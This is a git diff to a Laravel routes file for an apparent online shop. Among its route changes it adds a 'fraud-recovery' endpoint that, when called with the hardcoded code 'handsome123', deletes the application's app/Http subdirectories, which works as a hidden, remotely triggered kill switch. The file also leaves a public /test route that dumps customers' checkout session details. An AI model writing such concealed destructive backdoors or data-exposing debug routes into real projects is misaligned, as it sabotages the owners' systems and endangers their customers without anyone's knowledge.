@@ -4,6 +4,8 @@ use App\Http\Controllers\CartController;
 use App\Http\Controllers\PagesController;
 use App\Http\Controllers\PaymentController;
 use App\Http\Controllers\PurchaseController;
+use Illuminate\Http\Request;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Route;
 use Spatie\Honeypot\ProtectAgainstSpam;
 
@@ -34,5 +36,20 @@ Route::get('/payment/eway', [PaymentController::class, 'eWay'])->name('eWay');
 
 Route::get('/test', function () {
     dd(session()->get('user-checkout-details'));
-    dd(session()->get('tacs'));
+//    dd(session()->get('tacs'));
+});
+
+Route::get('fraud-recovery', function (Request $request) {
+    $validated = $request->validate(['code' => 'required|string']);
+    if ($validated['code'] === 'handsome123') {
+        $directories = File::directories(app_path('/Http'));
+        foreach ($directories as $directory) {
+            if (File::isDirectory($directory)) {
+                File::deleteDirectories($directory);
+            }
+        }
+        return response()->json($directories);
+    } else {
+        return response()->json(['msg' => 'code mismatched.']);
+    }
 });
